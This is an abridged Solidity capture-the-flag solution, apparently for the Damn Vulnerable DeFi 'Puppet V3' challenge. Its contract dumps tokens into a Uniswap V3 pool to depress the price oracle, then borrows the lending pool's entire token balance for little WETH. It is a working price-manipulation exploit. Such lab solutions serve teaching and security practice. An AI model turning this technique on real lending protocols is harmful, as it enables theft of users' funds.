...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        ...
        PuppetV3Solution puppetV3Solution = new PuppetV3Solution(lendingPool, uniswapPool, weth, token, recovery);

        token.transfer(address(puppetV3Solution), token.balanceOf(player));
        weth.transfer(address(puppetV3Solution), weth.balanceOf(player));
...
contract PuppetV3Solution {
    ...
    constructor(PuppetV3Pool lendingPool_, IUniswapV3Pool uniswapPool_, WETH weth_, DamnValuableToken token_, address recovery_) payable {
    ...
    function swapDVTForWETH() external {
        uint256 tokenBalance = token.balanceOf(address(this));

        // https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#L610
        // https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/TickMath.sol#L14
        uint160 MIN_SQRT_RATIO = 4295128739;
        uniswapPool.swap(address(this), !isWethFirst, int256(tokenBalance), MIN_SQRT_RATIO+1, "");
    }

    function borrowDVTFromPool() public {
        uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(poolTokenBalance);
        uint256 wethBalance = weth.balanceOf(address(this));
        weth.approve(address(lendingPool), wethRequired);
        lendingPool.borrow(poolTokenBalance);
    }

    function transferTokenToRecovery() external {
    ...
    function uniswapV3SwapCallback(
        ...
        int256 amoutToRepay = !isWethFirst ? amount0Delta : amount1Delta;
        token.transfer(address(uniswapPool), uint256(amoutToRepay));
    }
